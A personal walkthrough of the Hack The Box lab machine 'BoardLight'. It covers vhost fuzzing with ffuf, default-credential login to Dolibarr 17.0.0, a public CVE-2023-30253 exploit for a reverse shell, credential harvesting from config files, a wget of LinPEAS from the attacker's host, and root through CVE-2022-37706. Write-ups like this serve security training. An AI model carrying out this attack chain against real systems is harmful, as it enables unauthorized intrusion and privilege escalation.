# BoardLight (Linux)

# nmap 
22
80

## http

We have a couple of forms that seem to be sending something. 
We can click on the bottom footer **Board.htb** and takes us to **html.design**. 

I initially did not get anything from ffuf. 
Tried a simple xss script on the contact us form but nothing as well. Maybe it is stored XSS.

The footer domain got my attention again. Tried to put it in the url but got nothing (silly me).

I added it to my **/etc/hosts/** and ran the url again. 

Ran **ffuf** again and a new Vhost: `ffuf -u http://board.htb/ -H "HOST:FUZZ.board.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`

Added the new Vhost to **/etc/hosts** and ran the new url. 

I get a login page that uses **Dolibarr 17.0.0**. Tried **admin admin** and got in. 

# Dolibarr 

I dont see mucn from the login page. But we do know the verision number. 

Looked up an exploit and found this, https://github.com/dollarboysushil/Dolibarr-17.0.0-Exploit-CVE-2023-30253?tab=readme-ov-file.

From following the POC I was able to gain a reverse shell. 


# Reverse Shell 

I used **cd** and that is when I found the directory where it took me to **crm.board.htb/htdocs/conf** and was able to get a password. 

## SSH larissa

I got the passsword and I saw from the previous shell that there was only one user I had access to but did not had persmission to get into. 
Now I used this password and logged in as larissa.

**cat** first flag. 

We were not able to use `sudo -l`

After not getting much for a while I decided to use **linpeas**

I had to first host **./linpeas.sh** on a http server using python.

Then from the target's machine I used `wget http:ip:port/linpeas`

### linpeas

With linpeas I was able to find:
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight  --->  Before_0.25.4_(CVE-2022-37706)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)

`enlightenment --version`:
Version: 0.23.1

# Exploit 

Found this, https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh. 
And used **nano** to add the code into the targets machine.
`chmod +x exploit.sh`
Then I ran it and got root access. 

PWNED!

# **Summary**
This box was all about **proper enumeration** and **chaining exploits effectively**. The initial foothold came from recognizing a **suspicious domain in the footer**, leading me to a hidden **Vhost** after adding it to `/etc/hosts`. Brute-forcing subdomains with **ffuf** uncovered a login panel for **Dolibarr 17.0.0**, where I got in using **default credentials**. From there, a **public exploit (CVE-2023-30253)** allowed me to gain a **reverse shell**.

Once inside, I found **stored credentials** in a configuration file, which let me SSH into a user account (**larissa**). Without sudo privileges, I ran **LinPEAS**, which flagged **SUID binaries** tied to an outdated version of **Enlightenment (0.23.1)**. Exploiting **CVE-2022-37706** gave me **root access**, finishing the box.

## **Key Takeaways**
- **Enumeration is everything** – The Vhost discovery was a game-changer.
- **Web apps love to leak credentials** – The config file gave me SSH access.
- **Chaining exploits is the real skill** – Each step built on the last.
- **Privilege escalation is about patience** – LinPEAS made finding the exploit path simple.
- **Always check for default credentials** – They work more often than expected.

## **Things to Remember**
- **Add found domains to `/etc/hosts`** to check for hidden services.
- **Run `ffuf` on Vhosts**—you never know what might show up.
- **Config files often contain sensitive data**—always check them.
- **LinPEAS should be second nature** for privilege escalation.
- **Keep a mental (or physical) list of useful CVEs** for common software.

This box was a solid reminder that **exploitation isn’t about knowing everything—it’s about knowing where to look**.
